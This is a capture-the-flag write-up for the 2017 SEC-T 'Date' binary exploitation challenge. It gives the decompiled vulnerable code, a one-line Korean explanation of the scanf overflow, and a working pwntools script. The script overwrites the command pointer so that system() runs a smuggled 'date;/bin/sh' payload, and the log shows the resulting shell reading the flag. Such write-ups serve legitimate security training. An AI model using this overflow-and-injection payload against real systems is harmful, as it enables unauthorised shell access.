# [2017_SEC-T] \[PWN] Date

### Check Security

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



### Solution

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [sp+8h] [bp-418h]@5
  int v4; // [sp+Ch] [bp-414h]@1
  char v5; // [sp+10h] [bp-410h]@5
  __int64 v6; // [sp+418h] [bp-8h]@1

  v6 = *MK_FP(__FS__, 40LL);
  v4 = 0;
  command = "date";
  program = 0;
  while ( 1 )
  {
    if ( strstr(command, "date") )
      system(command);
    if ( program )
    {
      printf("Fill buffer: ", "date");
      __isoc99_scanf("%s", byte_6010A4);
      sleep(3u);
    }
    else
    {
      ++program;
      printf("Enter position in array: ", "date");
      read_line(&v5, 1023LL);
      v3 = 0;
      __isoc99_sscanf(&v5, "%d", &v3);
      printf("Enter character to read in array: ");
      read_line(&v5, 1023LL);
      byte_6010A4[(signed __int64)v3] = v5;
      sleep(2u);
    }
  }
}
```



#### 취약점 - Buffer Overflow

`scanf`에서 오버플로우가 발생합니다. command의 값을 조작할 수 있습니다.



###Exploit Code

```python
from pwn import *

#r = process("./date")
r = remote('pwn2.sect.ctf.rocks', 6666)
print r.recv()
r.sendline("1")
r.sendline("1")
print r.recv()
payload = "date;/bin/sh\x00"
payload += "a"*(0x6012A8-0x6010A4-len(payload)) + p64(0x6010A4)
print payload
r.sendline(payload)
r.interactive()
```



###Result

```
# python ex.py 
[+] Opening connection to pwn2.sect.ctf.rocks on port 6666: Done
Tue Sep 19 06:14:06 UTC 2017

Tue Sep 19 06:14:08 UTC 2017

date;/bin/sh\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa4\x10`\x00\x00\x00\x00\x00
[*] Switching to interactive mode
$ id
Tue Sep 19 06:14:11 UTC 2017
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ ls
chall
flag
redir.sh
$ cat flag
SECT{wh0a_one_Byte_overflow_so_pewpew}
```

